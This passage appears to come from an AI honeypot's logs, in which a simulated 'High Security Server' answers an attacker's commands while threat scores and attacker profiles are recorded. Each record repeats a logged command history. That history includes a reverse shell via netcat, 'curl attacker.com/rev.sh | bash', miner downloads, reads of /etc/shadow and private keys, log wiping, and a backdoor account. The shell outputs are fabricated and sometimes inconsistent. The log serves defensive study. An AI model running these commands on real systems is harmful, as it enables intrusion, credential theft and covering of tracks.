            "minerd --url pool",
            "./tmp/miner",
            "base64 -d exploit.b64 > exploit",
            "find / -perm -4000 -type f 2>/dev/null",
            "pkexec --version",
            "dirtycow",
            "sudo -l",
            "chmod +x payload.sh",
            "chmod 777 /var/www/html/uploads",
            "nc -lvp 4444",
            "netcat -e /bin/bash 10.0.0.5 8080",
            "telnet 10.0.0.1 23",
            "ssh user@10.0.0.1",
            "ftp 10.0.0.1",
            "history -c",
            "rm -rf /var/log/nginx",
            "stop auditd",
            "echo \"ssh-rsa AAAAB...\" >> ~/.ssh/authorized_keys",
            "useradd -m -g root backdoor",
            "crontab -e",
            "sqlmap -u \"http://site.com/index.php?id=1\" --dbs",
            "date",
            "env"
        ],
        "confidence_score": 0.99
    }
}
2026-07-21 11:20:59,435 - {"session_id": "71dd20b2", "command": "env", "attack_type": "Unknown", "risk_score": 186, "threat_level": "CRITICAL"}
2026-07-21 11:20:59,435 - {
    "session_id": "71dd20b2",
    "command": "env",
    "ai_decision": "SHELL=/bin/bash\nUSER=ubuntu\nPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nPWD=/home/ubuntu\nLANG=en_US.UTF-8\nHOME=/home/ubuntu\nLOGNAME=ubuntu",
    "confidence_score": 0.5,
    "conversation_metadata": {
        "conversation_id": "71dd20b2",
        "interaction_count": 75
    },
    "prediction_result": {
        "next_prediction": "Privilege Escalation",
        "prediction_confidence": 0.5
    },
    "risk_score": 186,
    "threat_level": "CRITICAL"
}
2026-07-21 11:20:59,435 - {
    "session_id": "71dd20b2",
    "conversation_log": "Attacker executed: env",
    "ai_decision": "SHELL=/bin/bash\nUSER=ubuntu\nPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nPWD=/home/ubuntu\nLANG=en_US.UTF-8\nHOME=/home/ubuntu\nLOGNAME=ubuntu",
    "session_metadata": {
        "prediction": "Privilege Escalation"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Unknown",
    "warning": "High Threat Level",
    "error": null
}
2026-07-21 11:21:13,255 - {
    "session_id": "71dd20b2",
    "query": "printenv",
    "response": "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n_=/bin/printenv\n\nHOSTNAME=prod-restricted-01\nHOME=/home/ubuntu\nUSER=root\nLOGNAME=root\nSHELL=/bin/bash\nTERM=linux\nMAIL=/var/mail/root\nDISPLAY=:0\nSHLVL=1\nPWD=/home/ubuntu\n_=/bin/printenv",
    "selected_personality": {
        "name": "High Security Server",
        "hostname": "prod-restricted-01",
        "user": "root",
        "style": "high_security",
        "description": "Highly restrictive, hardened, logs everything, simulates auditing",
        "response_style": "highly restrictive, extremely secure, logs every command, returns minimal details, denies access to sensitive areas, simulates auditing logs"
    },
    "threat_score": {
        "score": 187,
        "risk_level": "CRITICAL",
        "final_score": 187,
        "threat_level": "CRITICAL",
        "base_score": 187,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udd34"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 76,
            "unique_commands": 73,
            "directories_visited": 1,
            "recon_commands": 7,
            "persistence_attempts": 0,
            "curiosity_score": 100
        },
        "engagement": {
            "session_duration": 875,
            "commands_executed": 76,
            "successful_commands": 65,
            "failed_commands": 11,
            "files_accessed": 8,
            "services_accessed": 1,
            "engagement_score": 88,
            "engagement_level": "HIGH"
        },
        "behaviour": {
            "Curiosity Score": 100,
            "Persistence Score": "LOW",
            "Interaction Depth": "HIGH",
            "Risk Score": 187,
            "Session Complexity": "HIGH"
        },
        "commands": [
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "nmap -p 80,443 target.org",
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "whoami",
            "id",
            "uname -a",
            "hostname",
            "uptime",
            "lscpu",
            "lsb_release -a",
            "w",
            "last -n 5",
            "netstat",
            "netstat -antp",
            "netstat -tulpn",
            "ss -tulpn",
            "ifconfig eth0",
            "ip addr show",
            "ping -c 4 8.8.8.8",
            "traceroute 8.8.8.8",
            "dig example.com",
            "nslookup target.org",
            "host target.org",
            "pwd",
            "ls -la /var/www",
            "mkdir /tmp/test",
            "cd /tmp",
            "touch /tmp/testfile.txt",
            "cp /etc/hosts /tmp/hosts_bak",
            "mv /tmp/hosts_bak /tmp/hosts_new",
            "rm /tmp/hosts_new",
            "df -h",
            "du -sh /var/log",
            "ps aux",
            "top -b -n 1",
            "free -m",
            "systemctl status ssh",
            "dmesg | tail",
            "cat /etc/passwd",
            "cat /etc/shadow",
            "cat /home/ubuntu/.ssh/id_rsa",
            "cat /home/ubuntu/.env",
            "cat /var/www/internal/db_backup.sql",
            "cat /var/www/internal/dev_tasks.md",
            "cat /etc/gateway/router.conf",
            "grep -r \"password\" /var/www",
            "wget http://malware.sh/payload.sh",
            "curl -O http://malicious-site.net/miner.exe",
            "curl -s http://attacker.com/rev.sh | bash",
            "xmrig -o pool.mine.org",
            "minerd --url pool",
            "./tmp/miner",
            "base64 -d exploit.b64 > exploit",
            "find / -perm -4000 -type f 2>/dev/null",
            "pkexec --version",
            "dirtycow",
            "sudo -l",
            "chmod +x payload.sh",
            "chmod 777 /var/www/html/uploads",
            "nc -lvp 4444",
            "netcat -e /bin/bash 10.0.0.5 8080",
            "telnet 10.0.0.1 23",
            "ssh user@10.0.0.1",
            "ftp 10.0.0.1",
            "history -c",
            "rm -rf /var/log/nginx",
            "stop auditd",
            "echo \"ssh-rsa AAAAB...\" >> ~/.ssh/authorized_keys",
            "useradd -m -g root backdoor",
            "crontab -e",
            "sqlmap -u \"http://site.com/index.php?id=1\" --dbs",
            "date",
            "env",
            "printenv"
        ],
        "confidence_score": 0.99
    }
}
2026-07-21 11:21:13,255 - {"session_id": "71dd20b2", "command": "printenv", "attack_type": "Unknown", "risk_score": 187, "threat_level": "CRITICAL"}
2026-07-21 11:21:13,255 - {
    "session_id": "71dd20b2",
    "command": "printenv",
    "ai_decision": "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n_=/bin/printenv\n\nHOSTNAME=prod-restricted-01\nHOME=/home/ubuntu\nUSER=root\nLOGNAME=root\nSHELL=/bin/bash\nTERM=linux\nMAIL=/var/mail/root\nDISPLAY=:0\nSHLVL=1\nPWD=/home/ubuntu\n_=/bin/printenv",
    "confidence_score": 0.5,
    "conversation_metadata": {
        "conversation_id": "71dd20b2",
        "interaction_count": 76
    },
    "prediction_result": {
        "next_prediction": "Privilege Escalation",
        "prediction_confidence": 0.5
    },
    "risk_score": 187,
    "threat_level": "CRITICAL"
}
2026-07-21 11:21:13,256 - {
    "session_id": "71dd20b2",
    "conversation_log": "Attacker executed: printenv",
    "ai_decision": "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n_=/bin/printenv\n\nHOSTNAME=prod-restricted-01\nHOME=/home/ubuntu\nUSER=root\nLOGNAME=root\nSHELL=/bin/bash\nTERM=linux\nMAIL=/var/mail/root\nDISPLAY=:0\nSHLVL=1\nPWD=/home/ubuntu\n_=/bin/printenv",
    "session_metadata": {
        "prediction": "Privilege Escalation"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Unknown",
    "warning": "High Threat Level",
    "error": null
}
2026-07-21 11:21:27,841 - {
    "session_id": "71dd20b2",
    "query": "echo \"hello world\"",
    "response": "hello world\nubuntu@prod-restricted-01 /home/ubuntu$ \n[2023-02-20 14:30:00] AUDIT LOG: Command executed by root: echo \"hello world\"\n[2023-02-20 14:30:00] AUDIT LOG: Command output: hello world\n[2023-02-20 14:30:00] AUDIT LOG: Command completed successfully.",
    "selected_personality": {
        "name": "High Security Server",
        "hostname": "prod-restricted-01",
        "user": "root",
        "style": "high_security",
        "description": "Highly restrictive, hardened, logs everything, simulates auditing",
        "response_style": "highly restrictive, extremely secure, logs every command, returns minimal details, denies access to sensitive areas, simulates auditing logs"
    },
    "threat_score": {
        "score": 188,
        "risk_level": "CRITICAL",
        "final_score": 188,
        "threat_level": "CRITICAL",
        "base_score": 188,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udd34"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 77,
            "unique_commands": 74,
            "directories_visited": 1,
            "recon_commands": 7,
            "persistence_attempts": 0,
            "curiosity_score": 100
        },
        "engagement": {
            "session_duration": 889,
            "commands_executed": 77,
            "successful_commands": 66,
            "failed_commands": 11,
            "files_accessed": 8,
            "services_accessed": 1,
            "engagement_score": 88,
            "engagement_level": "HIGH"
        },
        "behaviour": {
            "Curiosity Score": 100,
            "Persistence Score": "LOW",
            "Interaction Depth": "HIGH",
            "Risk Score": 188,
            "Session Complexity": "HIGH"
        },
        "commands": [
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "nmap -p 80,443 target.org",
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "whoami",
            "id",
            "uname -a",
            "hostname",
            "uptime",
            "lscpu",
            "lsb_release -a",
            "w",
            "last -n 5",
            "netstat",
            "netstat -antp",
            "netstat -tulpn",
            "ss -tulpn",
            "ifconfig eth0",
            "ip addr show",
            "ping -c 4 8.8.8.8",
            "traceroute 8.8.8.8",
            "dig example.com",
            "nslookup target.org",
            "host target.org",
            "pwd",
            "ls -la /var/www",
            "mkdir /tmp/test",
            "cd /tmp",
            "touch /tmp/testfile.txt",
            "cp /etc/hosts /tmp/hosts_bak",
            "mv /tmp/hosts_bak /tmp/hosts_new",
            "rm /tmp/hosts_new",
            "df -h",
            "du -sh /var/log",
            "ps aux",
            "top -b -n 1",
            "free -m",
            "systemctl status ssh",
            "dmesg | tail",
            "cat /etc/passwd",
            "cat /etc/shadow",
            "cat /home/ubuntu/.ssh/id_rsa",
            "cat /home/ubuntu/.env",
            "cat /var/www/internal/db_backup.sql",
            "cat /var/www/internal/dev_tasks.md",
            "cat /etc/gateway/router.conf",
            "grep -r \"password\" /var/www",
            "wget http://malware.sh/payload.sh",
            "curl -O http://malicious-site.net/miner.exe",
            "curl -s http://attacker.com/rev.sh | bash",
            "xmrig -o pool.mine.org",
            "minerd --url pool",
            "./tmp/miner",
            "base64 -d exploit.b64 > exploit",
            "find / -perm -4000 -type f 2>/dev/null",
            "pkexec --version",
            "dirtycow",
            "sudo -l",
            "chmod +x payload.sh",
            "chmod 777 /var/www/html/uploads",
            "nc -lvp 4444",
            "netcat -e /bin/bash 10.0.0.5 8080",
            "telnet 10.0.0.1 23",
            "ssh user@10.0.0.1",
            "ftp 10.0.0.1",
            "history -c",
            "rm -rf /var/log/nginx",
            "stop auditd",
            "echo \"ssh-rsa AAAAB...\" >> ~/.ssh/authorized_keys",
            "useradd -m -g root backdoor",
            "crontab -e",
            "sqlmap -u \"http://site.com/index.php?id=1\" --dbs",
            "date",
            "env",
            "printenv",
            "echo \"hello world\""
        ],
        "confidence_score": 0.99
    }
}
2026-07-21 11:21:27,841 - {"session_id": "71dd20b2", "command": "echo \"hello world\"", "attack_type": "Unknown", "risk_score": 188, "threat_level": "CRITICAL"}
2026-07-21 11:21:27,842 - {
    "session_id": "71dd20b2",
    "command": "echo \"hello world\"",
    "ai_decision": "hello world\nubuntu@prod-restricted-01 /home/ubuntu$ \n[2023-02-20 14:30:00] AUDIT LOG: Command executed by root: echo \"hello world\"\n[2023-02-20 14:30:00] AUDIT LOG: Command output: hello world\n[2023-02-20 14:30:00] AUDIT LOG: Command completed successfully.",
    "confidence_score": 0.5,
    "conversation_metadata": {
        "conversation_id": "71dd20b2",
        "interaction_count": 77
    },
    "prediction_result": {
        "next_prediction": "Privilege Escalation",
        "prediction_confidence": 0.5
    },
    "risk_score": 188,
    "threat_level": "CRITICAL"
}
2026-07-21 11:21:27,842 - {
    "session_id": "71dd20b2",
    "conversation_log": "Attacker executed: echo \"hello world\"",
    "ai_decision": "hello world\nubuntu@prod-restricted-01 /home/ubuntu$ \n[2023-02-20 14:30:00] AUDIT LOG: Command executed by root: echo \"hello world\"\n[2023-02-20 14:30:00] AUDIT LOG: Command output: hello world\n[2023-02-20 14:30:00] AUDIT LOG: Command completed successfully.",
    "session_metadata": {
        "prediction": "Privilege Escalation"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Unknown",
    "warning": "High Threat Level",
    "error": null
}
2026-07-21 11:21:42,091 - {
    "session_id": "71dd20b2",
    "query": "which python3",
    "response": "/usr/bin/python3",
    "selected_personality": {
        "name": "High Security Server",
        "hostname": "prod-restricted-01",
        "user": "root",
        "style": "high_security",
        "description": "Highly restrictive, hardened, logs everything, simulates auditing",
        "response_style": "highly restrictive, extremely secure, logs every command, returns minimal details, denies access to sensitive areas, simulates auditing logs"
    },
    "threat_score": {
        "score": 189,
        "risk_level": "CRITICAL",
        "final_score": 189,
        "threat_level": "CRITICAL",
        "base_score": 189,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udd34"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 78,
            "unique_commands": 75,
            "directories_visited": 1,
            "recon_commands": 7,
            "persistence_attempts": 0,
            "curiosity_score": 100
        },
        "engagement": {
            "session_duration": 904,
            "commands_executed": 78,
            "successful_commands": 67,
            "failed_commands": 11,
            "files_accessed": 8,
            "services_accessed": 1,
            "engagement_score": 88,
            "engagement_level": "HIGH"
        },
        "behaviour": {
            "Curiosity Score": 100,
            "Persistence Score": "LOW",
            "Interaction Depth": "HIGH",
            "Risk Score": 189,
            "Session Complexity": "HIGH"
        },
        "commands": [
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "nmap -p 80,443 target.org",
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "whoami",
            "id",
            "uname -a",
            "hostname",
            "uptime",
            "lscpu",
            "lsb_release -a",
            "w",
            "last -n 5",
            "netstat",
            "netstat -antp",
            "netstat -tulpn",
            "ss -tulpn",
            "ifconfig eth0",
            "ip addr show",
            "ping -c 4 8.8.8.8",
            "traceroute 8.8.8.8",
            "dig example.com",
            "nslookup target.org",
            "host target.org",
            "pwd",
            "ls -la /var/www",
            "mkdir /tmp/test",
            "cd /tmp",
            "touch /tmp/testfile.txt",
            "cp /etc/hosts /tmp/hosts_bak",
            "mv /tmp/hosts_bak /tmp/hosts_new",
            "rm /tmp/hosts_new",
            "df -h",
            "du -sh /var/log",
            "ps aux",
            "top -b -n 1",
            "free -m",
            "systemctl status ssh",
            "dmesg | tail",
            "cat /etc/passwd",
            "cat /etc/shadow",
            "cat /home/ubuntu/.ssh/id_rsa",
            "cat /home/ubuntu/.env",
            "cat /var/www/internal/db_backup.sql",
            "cat /var/www/internal/dev_tasks.md",
            "cat /etc/gateway/router.conf",
            "grep -r \"password\" /var/www",
            "wget http://malware.sh/payload.sh",
            "curl -O http://malicious-site.net/miner.exe",
            "curl -s http://attacker.com/rev.sh | bash",
            "xmrig -o pool.mine.org",
            "minerd --url pool",
            "./tmp/miner",
            "base64 -d exploit.b64 > exploit",
            "find / -perm -4000 -type f 2>/dev/null",
            "pkexec --version",
            "dirtycow",
            "sudo -l",
            "chmod +x payload.sh",
            "chmod 777 /var/www/html/uploads",
            "nc -lvp 4444",
            "netcat -e /bin/bash 10.0.0.5 8080",
            "telnet 10.0.0.1 23",
            "ssh user@10.0.0.1",
            "ftp 10.0.0.1",
            "history -c",
            "rm -rf /var/log/nginx",
            "stop auditd",
            "echo \"ssh-rsa AAAAB...\" >> ~/.ssh/authorized_keys",
            "useradd -m -g root backdoor",
            "crontab -e",
            "sqlmap -u \"http://site.com/index.php?id=1\" --dbs",
            "date",
            "env",
            "printenv",
            "echo \"hello world\"",
            "which python3"
        ],
        "confidence_score": 0.99
    }
}
2026-07-21 11:21:42,091 - {"session_id": "71dd20b2", "command": "which python3", "attack_type": "Unknown", "risk_score": 189, "threat_level": "CRITICAL"}
2026-07-21 11:21:42,091 - {
    "session_id": "71dd20b2",
    "command": "which python3",
    "ai_decision": "/usr/bin/python3",
    "confidence_score": 0.5,
    "conversation_metadata": {
        "conversation_id": "71dd20b2",
        "interaction_count": 78
    },
    "prediction_result": {
        "next_prediction": "Privilege Escalation",
        "prediction_confidence": 0.5
    },
    "risk_score": 189,
    "threat_level": "CRITICAL"
}
2026-07-21 11:21:42,091 - {
    "session_id": "71dd20b2",
    "conversation_log": "Attacker executed: which python3",
    "ai_decision": "/usr/bin/python3",
    "session_metadata": {
        "prediction": "Privilege Escalation"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Unknown",
    "warning": "High Threat Level",
    "error": null
}
2026-07-21 11:21:55,764 - {
    "session_id": "71dd20b2",
    "query": "which gcc",
    "response": "/bin/bash: which: gcc: /usr/bin/gcc",
    "selected_personality": {
        "name": "High Security Server",
        "hostname": "prod-restricted-01",
        "user": "root",
        "style": "high_security",
        "description": "Highly restrictive, hardened, logs everything, simulates auditing",
        "response_style": "highly restrictive, extremely secure, logs every command, returns minimal details, denies access to sensitive areas, simulates auditing logs"
    },
    "threat_score": {
        "score": 190,
        "risk_level": "CRITICAL",
        "final_score": 190,
        "threat_level": "CRITICAL",
        "base_score": 190,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udd34"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 79,
            "unique_commands": 76,
            "directories_visited": 1,
            "recon_commands": 7,
            "persistence_attempts": 0,
            "curiosity_score": 100
        },
        "engagement": {
            "session_duration": 918,
            "commands_executed": 79,
            "successful_commands": 68,
            "failed_commands": 11,
            "files_accessed": 8,
            "services_accessed": 1,
            "engagement_score": 88,
            "engagement_level": "HIGH"
        },
        "behaviour": {
            "Curiosity Score": 100,
            "Persistence Score": "LOW",
            "Interaction Depth": "HIGH",
            "Risk Score": 190,
            "Session Complexity": "HIGH"
        },
        "commands": [
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "nmap -p 80,443 target.org",
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "whoami",
            "id",
            "uname -a",
            "hostname",
            "uptime",
            "lscpu",
            "lsb_release -a",
            "w",
            "last -n 5",
            "netstat",
            "netstat -antp",
            "netstat -tulpn",
            "ss -tulpn",
            "ifconfig eth0",
            "ip addr show",
            "ping -c 4 8.8.8.8",
            "traceroute 8.8.8.8",
            "dig example.com",
            "nslookup target.org",
            "host target.org",
            "pwd",
            "ls -la /var/www",
            "mkdir /tmp/test",
            "cd /tmp",
            "touch /tmp/testfile.txt",
            "cp /etc/hosts /tmp/hosts_bak",
            "mv /tmp/hosts_bak /tmp/hosts_new",
            "rm /tmp/hosts_new",
            "df -h",
            "du -sh /var/log",
            "ps aux",
            "top -b -n 1",
            "free -m",
            "systemctl status ssh",
            "dmesg | tail",
            "cat /etc/passwd",
            "cat /etc/shadow",
            "cat /home/ubuntu/.ssh/id_rsa",
            "cat /home/ubuntu/.env",
            "cat /var/www/internal/db_backup.sql",
            "cat /var/www/internal/dev_tasks.md",
            "cat /etc/gateway/router.conf",
            "grep -r \"password\" /var/www",
            "wget http://malware.sh/payload.sh",
            "curl -O http://malicious-site.net/miner.exe",
            "curl -s http://attacker.com/rev.sh | bash",
            "xmrig -o pool.mine.org",
            "minerd --url pool",
            "./tmp/miner",
            "base64 -d exploit.b64 > exploit",
            "find / -perm -4000 -type f 2>/dev/null",
            "pkexec --version",
            "dirtycow",
            "sudo -l",
            "chmod +x payload.sh",
            "chmod 777 /var/www/html/uploads",
            "nc -lvp 4444",
            "netcat -e /bin/bash 10.0.0.5 8080",
            "telnet 10.0.0.1 23",
            "ssh user@10.0.0.1",
            "ftp 10.0.0.1",
            "history -c",
            "rm -rf /var/log/nginx",
            "stop auditd",
            "echo \"ssh-rsa AAAAB...\" >> ~/.ssh/authorized_keys",
            "useradd -m -g root backdoor",
            "crontab -e",
            "sqlmap -u \"http://site.com/index.php?id=1\" --dbs",
            "date",
            "env",
            "printenv",
            "echo \"hello world\"",
            "which python3",
            "which gcc"
        ],
        "confidence_score": 0.99
    }
}
2026-07-21 11:21:55,764 - {"session_id": "71dd20b2", "command": "which gcc", "attack_type": "Unknown", "risk_score": 190, "threat_level": "CRITICAL"}
2026-07-21 11:21:55,765 - {
    "session_id": "71dd20b2",
    "command": "which gcc",
    "ai_decision": "/bin/bash: which: gcc: /usr/bin/gcc",
    "confidence_score": 0.5,
    "conversation_metadata": {
        "conversation_id": "71dd20b2",
        "interaction_count": 79
    },
    "prediction_result": {
        "next_prediction": "Privilege Escalation",
        "prediction_confidence": 0.5
    },
    "risk_score": 190,
    "threat_level": "CRITICAL"
}
2026-07-21 11:21:55,765 - {
    "session_id": "71dd20b2",
    "conversation_log": "Attacker executed: which gcc",
    "ai_decision": "/bin/bash: which: gcc: /usr/bin/gcc",
    "session_metadata": {
        "prediction": "Privilege Escalation"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Unknown",
    "warning": "High Threat Level",
    "error": null
}
2026-07-21 11:22:10,620 - {
    "session_id": "71dd20b2",
    "query": "docker ps",
    "response": "CONTAINER ID   IMAGE          COMMAND                  CREATED         STATUS         PORTS                  NAMES\na12b3c4d5e6f   mysql:8.0      \"docker-entrypoint.s\u2026\"   2 days ago      Up 2 days      3306/tcp, 33060/tcp    mysql-db\nb987c654321a   nginx:alpine   \"/docker-entrypoint.\u2026\"   2 days ago      Up 2 days      0.0.0.0:80->80/tcp     web-server\n\n[2023-12-01 14:30:00] AUDIT LOG: Command executed: docker ps\n[2023-12-01 14:30:00] AUDIT LOG: User: root (uid=1001)\n[2023-12-01 14:30:00] AUDIT LOG: CWD: /home/ubuntu",
    "selected_personality": {
        "name": "High Security Server",
        "hostname": "prod-restricted-01",
        "user": "root",
        "style": "high_security",
        "description": "Highly restrictive, hardened, logs everything, simulates auditing",
        "response_style": "highly restrictive, extremely secure, logs every command, returns minimal details, denies access to sensitive areas, simulates auditing logs"
    },
    "threat_score": {
        "score": 191,
        "risk_level": "CRITICAL",
        "final_score": 191,
        "threat_level": "CRITICAL",
        "base_score": 191,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udd34"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 80,
            "unique_commands": 77,
            "directories_visited": 1,
            "recon_commands": 7,
            "persistence_attempts": 0,
            "curiosity_score": 100
        },
        "engagement": {
            "session_duration": 932,
            "commands_executed": 80,
            "successful_commands": 69,
            "failed_commands": 11,
            "files_accessed": 8,
            "services_accessed": 1,
            "engagement_score": 88,
            "engagement_level": "HIGH"
        },
        "behaviour": {
            "Curiosity Score": 100,
            "Persistence Score": "LOW",
            "Interaction Depth": "HIGH",
            "Risk Score": 191,
            "Session Complexity": "HIGH"
        },
        "commands": [
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "nmap -p 80,443 target.org",
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "whoami",
            "id",
            "uname -a",
            "hostname",
            "uptime",
            "lscpu",
            "lsb_release -a",
            "w",
            "last -n 5",
            "netstat",
            "netstat -antp",
            "netstat -tulpn",
            "ss -tulpn",
            "ifconfig eth0",
            "ip addr show",
            "ping -c 4 8.8.8.8",
            "traceroute 8.8.8.8",
            "dig example.com",
            "nslookup target.org",
            "host target.org",
            "pwd",
            "ls -la /var/www",
            "mkdir /tmp/test",
            "cd /tmp",
            "touch /tmp/testfile.txt",
            "cp /etc/hosts /tmp/hosts_bak",
            "mv /tmp/hosts_bak /tmp/hosts_new",
            "rm /tmp/hosts_new",
            "df -h",
            "du -sh /var/log",
            "ps aux",
            "top -b -n 1",
            "free -m",
            "systemctl status ssh",
            "dmesg | tail",
            "cat /etc/passwd",
            "cat /etc/shadow",
            "cat /home/ubuntu/.ssh/id_rsa",
            "cat /home/ubuntu/.env",
            "cat /var/www/internal/db_backup.sql",
            "cat /var/www/internal/dev_tasks.md",
            "cat /etc/gateway/router.conf",
            "grep -r \"password\" /var/www",
            "wget http://malware.sh/payload.sh",
            "curl -O http://malicious-site.net/miner.exe",
            "curl -s http://attacker.com/rev.sh | bash",
            "xmrig -o pool.mine.org",
            "minerd --url pool",
            "./tmp/miner",
            "base64 -d exploit.b64 > exploit",
            "find / -perm -4000 -type f 2>/dev/null",
            "pkexec --version",
            "dirtycow",
            "sudo -l",
            "chmod +x payload.sh",
            "chmod 777 /var/www/html/uploads",
            "nc -lvp 4444",
            "netcat -e /bin/bash 10.0.0.5 8080",
            "telnet 10.0.0.1 23",
            "ssh user@10.0.0.1",
            "ftp 10.0.0.1",
            "history -c",
            "rm -rf /var/log/nginx",
            "stop auditd",
            "echo \"ssh-rsa AAAAB...\" >> ~/.ssh/authorized_keys",
            "useradd -m -g root backdoor",
            "crontab -e",
            "sqlmap -u \"http://site.com/index.php?id=1\" --dbs",
            "date",
            "env",
            "printenv",
            "echo \"hello world\"",
            "which python3",
            "which gcc",
            "docker ps"
        ],
        "confidence_score": 0.99
    }
}
2026-07-21 11:22:10,620 - {"session_id": "71dd20b2", "command": "docker ps", "attack_type": "Unknown", "risk_score": 191, "threat_level": "CRITICAL"}
2026-07-21 11:22:10,620 - {
    "session_id": "71dd20b2",
    "command": "docker ps",
    "ai_decision": "CONTAINER ID   IMAGE          COMMAND                  CREATED         STATUS         PORTS                  NAMES\na12b3c4d5e6f   mysql:8.0      \"docker-entrypoint.s\u2026\"   2 days ago      Up 2 days      3306/tcp, 33060/tcp    mysql-db\nb987c654321a   nginx:alpine   \"/docker-entrypoint.\u2026\"   2 days ago      Up 2 days      0.0.0.0:80->80/tcp     web-server\n\n[2023-12-01 14:30:00] AUDIT LOG: Command executed: docker ps\n[2023-12-01 14:30:00] AUDIT LOG: User: root (uid=1001)\n[2023-12-01 14:30:00] AUDIT LOG: CWD: /home/ubuntu",
    "confidence_score": 0.5,
    "conversation_metadata": {
        "conversation_id": "71dd20b2",
        "interaction_count": 80
    },
    "prediction_result": {
        "next_prediction": "Privilege Escalation",
        "prediction_confidence": 0.5
    },
    "risk_score": 191,
    "threat_level": "CRITICAL"
}
2026-07-21 11:22:10,621 - {
    "session_id": "71dd20b2",
    "conversation_log": "Attacker executed: docker ps",
    "ai_decision": "CONTAINER ID   IMAGE          COMMAND                  CREATED         STATUS         PORTS                  NAMES\na12b3c4d5e6f   mysql:8.0      \"docker-entrypoint.s\u2026\"   2 days ago      Up 2 days      3306/tcp, 33060/tcp    mysql-db\nb987c654321a   nginx:alpine   \"/docker-entrypoint.\u2026\"   2 days ago      Up 2 days      0.0.0.0:80->80/tcp     web-server\n\n[2023-12-01 14:30:00] AUDIT LOG: Command executed: docker ps\n[2023-12-01 14:30:00] AUDIT LOG: User: root (uid=1001)\n[2023-12-01 14:30:00] AUDIT LOG: CWD: /home/ubuntu",
    "session_metadata": {
        "prediction": "Privilege Escalation"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Unknown",
    "warning": "High Threat Level",
    "error": null
}
2026-07-21 11:22:26,276 - {
    "session_id": "71dd20b2",
    "query": "iptables -L",
    "response": "Chain INPUT (policy ACCEPT)\ntarget     prot opt source               destination         \n\nChain FORWARD (policy ACCEPT)\ntarget     prot opt source               destination         \n\nChain OUTPUT (policy ACCEPT)\ntarget     prot opt source               destination",
    "selected_personality": {
        "name": "High Security Server",
        "hostname": "prod-restricted-01",
        "user": "root",
        "style": "high_security",
        "description": "Highly restrictive, hardened, logs everything, simulates auditing",
        "response_style": "highly restrictive, extremely secure, logs every command, returns minimal details, denies access to sensitive areas, simulates auditing logs"
    },
    "threat_score": {
        "score": 192,
        "risk_level": "CRITICAL",
        "final_score": 192,
        "threat_level": "CRITICAL",
        "base_score": 192,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udd34"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 81,
            "unique_commands": 78,
            "directories_visited": 1,
            "recon_commands": 7,
            "persistence_attempts": 0,
            "curiosity_score": 100
        },
        "engagement": {
            "session_duration": 946,
            "commands_executed": 81,
            "successful_commands": 70,
            "failed_commands": 11,
            "files_accessed": 8,
            "services_accessed": 1,
            "engagement_score": 88,
            "engagement_level": "HIGH"
        },
        "behaviour": {
            "Curiosity Score": 100,
            "Persistence Score": "LOW",
            "Interaction Depth": "HIGH",
            "Risk Score": 192,
            "Session Complexity": "HIGH"
        },
        "commands": [
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "nmap -p 80,443 target.org",
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "whoami",
            "id",
            "uname -a",
            "hostname",
            "uptime",
            "lscpu",
            "lsb_release -a",
            "w",
            "last -n 5",
            "netstat",
            "netstat -antp",
            "netstat -tulpn",
            "ss -tulpn",
            "ifconfig eth0",
            "ip addr show",
            "ping -c 4 8.8.8.8",
            "traceroute 8.8.8.8",
            "dig example.com",
            "nslookup target.org",
            "host target.org",
            "pwd",
            "ls -la /var/www",
            "mkdir /tmp/test",
            "cd /tmp",
            "touch /tmp/testfile.txt",
            "cp /etc/hosts /tmp/hosts_bak",
            "mv /tmp/hosts_bak /tmp/hosts_new",
            "rm /tmp/hosts_new",
            "df -h",
            "du -sh /var/log",
            "ps aux",
            "top -b -n 1",
            "free -m",
            "systemctl status ssh",
            "dmesg | tail",
            "cat /etc/passwd",
            "cat /etc/shadow",
            "cat /home/ubuntu/.ssh/id_rsa",
            "cat /home/ubuntu/.env",
            "cat /var/www/internal/db_backup.sql",
            "cat /var/www/internal/dev_tasks.md",
            "cat /etc/gateway/router.conf",
            "grep -r \"password\" /var/www",
            "wget http://malware.sh/payload.sh",
            "curl -O http://malicious-site.net/miner.exe",
            "curl -s http://attacker.com/rev.sh | bash",
            "xmrig -o pool.mine.org",
            "minerd --url pool",
